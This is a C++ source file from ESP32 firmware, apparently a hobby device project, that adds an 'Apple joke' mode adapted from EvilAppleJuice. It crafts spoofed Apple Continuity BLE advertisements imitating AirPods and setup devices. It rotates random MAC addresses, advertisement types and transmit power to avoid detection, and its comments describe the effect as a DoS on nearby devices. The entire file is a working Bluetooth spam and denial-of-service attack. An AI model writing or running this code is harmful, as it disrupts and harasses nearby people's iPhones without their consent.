#include "defines.h"

#if APPLE_JOKE
#include "appleJoke.h"

#include "esp_gap_ble_api.h"

#include "../../other/EvilAppleJuice-ESP32/src/devices.hpp"

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define APPLE_JOKE_MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define APPLE_JOKE_MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define APPLE_JOKE_MAX_TX_POWER ESP_PWR_LVL_P9
#endif

BLEAdvertising *ApAdvertising;
BLEServer *ApServer;

bool appleJokeRunning = false;
int appleDelay;

static void generateApplePacket(const AppleDevice &device, uint8_t *buffer, size_t &outLength)
{
    memset(buffer, 0, 31);

    if (device.type == APPLE_AUDIO)
    {
        outLength = 31;
        uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
        uint8_t body[] = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};

        memcpy(buffer, header, 7);
        buffer[7] = device.modelId;
        memcpy(buffer + 8, body, 11);
    }
    else if (device.type == APPLE_SETUP)
    {
        outLength = 23;
        uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
        uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

        memcpy(buffer, prefix, 13);
        buffer[13] = device.modelId;
        memcpy(buffer + 14, suffix, 9);
    }
}

static void setAppleAdvertisementData(BLEAdvertisementData &advertisementData, const AppleDevice &device)
{
    uint8_t packet[31];
    size_t packetLen;
    generateApplePacket(device, packet, packetLen);
    advertisementData.addData((char*)packet, packetLen);
}

static void setRandomAppleDeviceData(BLEAdvertisementData &advertisementData)
{
    int index = betterRandom(NUM_DEVICES);
    setAppleAdvertisementData(advertisementData, ALL_DEVICES[index]);
}

static void randomizeAppleTxPower()
{
    int randVal = betterRandom(100);
    if (randVal < 70)
    {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, APPLE_JOKE_MAX_TX_POWER);
    }
    else if (randVal < 85)
    {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 1));
    }
    else if (randVal < 95)
    {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 2));
    }
    else if (randVal < 99)
    {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 3));
    }
    else
    {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(APPLE_JOKE_MAX_TX_POWER - 4));
    }
}

// Here init and loop is mostly just copied from the EvilAppleJuice-ESP32 main.cpp
void initAppleJoke()
{
    appleJokeRunning = true;
    debugLog("Executing initAppleJoke");
    // Show text
    dis->fillScreen(SCWhite);
    simpleCenterText("Eating apples");
    disUp(true);

    // Init EvilAppleJuice
    BLEDevice::init("AirPods 69");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, APPLE_JOKE_MAX_TX_POWER);

    // Create the BLE Server
    ApServer = BLEDevice::createServer();
    ApAdvertising = ApServer->getAdvertising();

    // seems we need to init it with an address in setup() step.
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    ApAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
    appleDelay = 800;
}

void loopAppleJoke()
{
    resetSleepDelay();
    debugLog("Executing loopAppleJoke");
    // First generate fake random MAC
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++)
    {
        dummy_addr[i] = betterRandom(256);

        // It seems for some reason first 4 bits
        // Need to be high (aka 0b1111), so we
        // OR with 0xF0
        if (i == 0)
        {
            dummy_addr[i] |= 0xF0;
        }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    // Randomly pick data from one of the upstream Apple devices.
    setRandomAppleDeviceData(oAdvertisementData);

    /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
          the three advertising PDU types when you want to connect to Apple devices.
              // 0 = ADV_TYPE_IND,
              // 1 = ADV_TYPE_SCAN_IND
              // 2 = ADV_TYPE_NONCONN_IND

          Randomly using any of these PDU types may increase detectability of spoofed packets.

          What we know for sure:
          - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                            Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
      */

    int adv_type_choice = betterRandom(3);
    if (adv_type_choice == 0)
    {
        ApAdvertising->setAdvertisementType(ADV_TYPE_IND);
    }
    else if (adv_type_choice == 1)
    {
        ApAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    }
    else
    {
        ApAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    ApAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    ApAdvertising->setAdvertisementData(oAdvertisementData);

    // Set advertising interval
    /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
        an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.

        These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
    */

    // ApAdvertising->setMinInterval(0x20);
    // ApAdvertising->setMaxInterval(0x20);
    // ApAdvertising->setMinPreferred(0x20);
    // ApAdvertising->setMaxPreferred(0x20);

    // Start advertising
    debugLog("Sending Advertisement...");
    ApAdvertising->start();

    bool ignoreDelay = false;
    switch (useButton())
    {
    case Up:
    {   
        appleDelay = appleDelay + 100;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    case Down:
    {
        appleDelay = appleDelay - 100;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    case LongUp:
    {
        appleDelay = appleDelay + 300;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    case LongDown:
    {
        appleDelay = appleDelay - 300;
        checkMaxMin(&appleDelay, 15000, 1, false);
        ignoreDelay = true;
        break;
    }
    }
    debugLog("appleDelay is: " + String(appleDelay));
    if(ignoreDelay == false) {
        delayTask(appleDelay);
    }
    ApAdvertising->stop();
    randomizeAppleTxPower();
}

void exitAppleJoke()
{
    debugLog("Executing exitAppleJoke");
    // Idk
    delete ApAdvertising;
    delete ApServer;
    BLEDevice::deinit(true);
    appleJokeRunning = false;

    switchBack();
    
}

#endif
